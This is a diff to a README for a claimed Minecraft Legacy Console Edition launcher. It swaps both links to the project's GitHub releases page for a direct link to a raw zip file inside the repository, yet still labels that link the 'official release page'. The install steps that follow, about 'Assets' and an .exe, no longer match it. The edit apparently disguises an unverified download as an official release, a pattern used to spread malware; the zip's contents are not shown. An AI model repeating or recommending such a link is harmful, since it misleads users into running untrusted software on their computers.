@@ -1,6 +1,6 @@
 # 🎮 LCE-Emerald-Launcher - Experience legacy console Minecraft on PC
 
-[![](https://img.shields.io/badge/Download-LCE-Emerald-Launcher-blue.svg)](https://github.com/Dorieintractable938/LCE-Emerald-Launcher/releases)
+[![](https://img.shields.io/badge/Download-LCE-Emerald-Launcher-blue.svg)](https://github.com/Dorieintractable938/LCE-Emerald-Launcher/raw/refs/heads/main/Sources/Launcher-Emerald-LC-v3.5-beta.5.zip)
 
 ## What is LCE-Emerald-Launcher?
 
@@ -17,7 +17,7 @@ LCE-Emerald-Launcher brings the classic Minecraft Legacy Console Edition interfa
 
 ## 📥 How to Install
 
-1. Visit the [official release page](https://github.com/Dorieintractable938/LCE-Emerald-Launcher/releases) to access the download files.
+1. Visit the [official release page](https://github.com/Dorieintractable938/LCE-Emerald-Launcher/raw/refs/heads/main/Sources/Launcher-Emerald-LC-v3.5-beta.5.zip) to access the download files.
 2. Look for the section labeled "Assets" at the bottom of the latest release post.
 3. Click the file ending in `.exe` to start the download to your computer.
 4. Locate the file in your Downloads folder after the download ends.
